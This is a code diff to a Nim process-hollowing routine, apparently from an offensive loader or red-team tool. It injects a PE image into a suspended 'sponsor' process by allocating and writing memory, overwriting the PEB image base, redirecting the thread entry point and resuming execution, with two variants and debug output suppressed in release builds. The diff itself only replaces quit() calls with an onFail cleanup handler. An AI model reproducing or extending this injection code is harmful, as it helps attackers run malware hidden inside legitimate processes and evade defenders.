@@ -36,7 +36,7 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
         addr ret
     ) != 0:
         when not defined(release): echo "[-] Could not query sponsor process"   
-        quit()
+        onFail(sponsorProcessHandle)
     
     let sponsorPeb = bi.PebBaseAddress
     when not defined(release): echo "[i] Sponsor PEB address: 0x" & $cast[int](sponsorPeb).toHex
@@ -54,7 +54,7 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
         )
         if newImageBaseAddress == NULL:
             when not defined(release): echo "[-] Could not allocate in sponsor process at preffered address - 0x" & $cast[int](peImageImageBase).toHex   
-            
+
             # Allocate memory in sponsor process (any address)
             when not defined(release): echo "[*] Allocating memory in sponsor process (any address)"    
             newImageBaseAddress = VirtualAllocEx(
@@ -66,7 +66,7 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
             )
             if newImageBaseAddress == NULL:
                 when not defined(release): echo "[-] Could not allocate in sponsor process at any address"
-                quit()
+                onFail(sponsorProcessHandle)
                 
         when not defined(release): echo "[i] New image base address: 0x" & $cast[int](newImageBaseAddress).toHex 
         when not defined(release): echo "[i] New entrypoint: 0x" & $(cast[int](newImageBaseAddress) + cast[int](peImageEntryPoint)).toHex 
@@ -81,7 +81,7 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
             NULL
         ) != TRUE:
             when not defined(release): echo "[-] Could not write to sponsor process"
-            quit() 
+            onFail(sponsorProcessHandle)
 
         # Copy PE sections to sponsor process
         when not defined(release): echo "[*] Copying PE sections to sponsor process" 
@@ -94,7 +94,7 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
                 NULL
             ) != TRUE:
                 when not defined(release): echo "[-] Could not write to sponsor process"
-                quit() 
+                onFail(sponsorProcessHandle)
         
         # Overwrite sponsor PEB with the new image base address 
         when not defined(release): echo "[*] Overwriting PEB with the new image base address"
@@ -106,27 +106,27 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
             NULL
         ) != TRUE:
             when not defined(release): echo "[-] Could not write to sponsor process"
-            quit() 
+            onFail(sponsorProcessHandle)
 
         # If needed, apply relocations
         if newImageBaseAddress != peImageImageBase:
             when not defined(release): echo "[*] Applying relocations"
             if not applyRelocations(peBytesPtr, newImageBaseAddress, sponsorProcessHandle):
                 when not defined(release): echo "[-] Could not apply relocations"
-                quit()
+                onFail(sponsorProcessHandle)
 
         # Change sponsor thread Entrypoint
         var context: CONTEXT
         context.ContextFlags = CONTEXT_INTEGER
         if GetThreadContext(sponsorThreadHandle, addr context) == FALSE:
             when not defined(release): echo "[-] Could not read from sponsor process PEB"
-            quit()
+            onFail(sponsorProcessHandle)
         var entryPoint = cast[DWORD64](newImageBaseAddress) + cast[DWORD64](peImageEntryPoint)
         when not defined(release): echo "[i] Changing RCX register to point the new entrypoint: 0x" & $context.Rcx.toHex & " -> 0x" & $entryPoint.toHex
         context.Rcx = cast[DWORD64](entryPoint)
         if SetThreadContext(sponsorThreadHandle, addr context) == FALSE:
             when not defined(release): echo "[-] Could not write to sponsor process PEB"
-            quit()
+            onFail(sponsorProcessHandle)
         
         # Resume remote thread 
         when not defined(release): echo "[*] Resuming remote thread"
@@ -162,7 +162,7 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
             ) 
             if res != 0:
                 when not defined(release): echo "[-] Could not allocate in sponsor process at any address"
-                quit()
+                onFail(sponsorProcessHandle)
                 
         when not defined(release): echo "[i] New image base address: 0x" & $cast[int](newImageBaseAddress).toHex 
         when not defined(release): echo "[i] New entrypoint: 0x" & $(cast[int](newImageBaseAddress) + cast[int](peImageEntryPoint)).toHex 
@@ -177,7 +177,7 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
             NULL
         ) != 0:
             when not defined(release): echo "[-] Could not write to sponsor process"
-            quit() 
+            onFail(sponsorProcessHandle)
 
         # Copy PE sections to sponsor process
         when not defined(release): echo "[*] Copying PE sections to sponsor process"    
@@ -190,7 +190,7 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
                 NULL
             ) != 0:
                 when not defined(release): echo "[-] Could not write headers to sponsor process"
-                quit()
+                onFail(sponsorProcessHandle)
         
         # Overwrite sponsor PEB with the new image base address 
         when not defined(release): echo "[*] Overwriting PEB with the new image base address"
@@ -202,14 +202,14 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
             NULL
         ) != 0:
             when not defined(release): echo "[-] Could not write sections to sponsor process"
-            quit()
+            onFail(sponsorProcessHandle)
 
         # If needed, apply relocations
         if newImageBaseAddress != peImageImageBase:
             when not defined(release): echo "[*] Applying relocations"
             if not applyRelocations(peBytesPtr, newImageBaseAddress, sponsorProcessHandle):
                 when not defined(release): echo "[-] Could not apply relocations"
-                quit()
+                onFail(sponsorProcessHandle)
 
         # Change sponsor thread Entrypoint
         var context: CONTEXT
@@ -219,7 +219,7 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
             addr context
         ) != 0:
             when not defined(release): echo "[-] Could not read from sponsor process PEB"
-            quit()
+            onFail(sponsorProcessHandle)
         var entryPoint = cast[DWORD64](newImageBaseAddress) + cast[DWORD64](peImageEntryPoint)
         var wtf_dont_ever_remove_this_line_from_here = context.Rcx #[
         Here I've been experiencing the fucking wierdest BUG in the whole world of humanity
@@ -232,7 +232,7 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
             sponsorThreadHandle, addr context
         ) != 0:
             when not defined(release): echo "[-] Could not write to sponsor process PEB"
-            quit()
+            onFail(sponsorProcessHandle)
             
         # Resume remote thread 
         when not defined(release): echo "[*] Resuming remote thread"
@@ -240,5 +240,5 @@ proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
             sponsorThreadHandle,
             NULL
         ) != 0:
-            when not defined(release): echo "[-] Could resume the thread"
-            quit()
+            when not defined(release): echo "[-] Could not resume the thread"
+            onFail(sponsorProcessHandle)
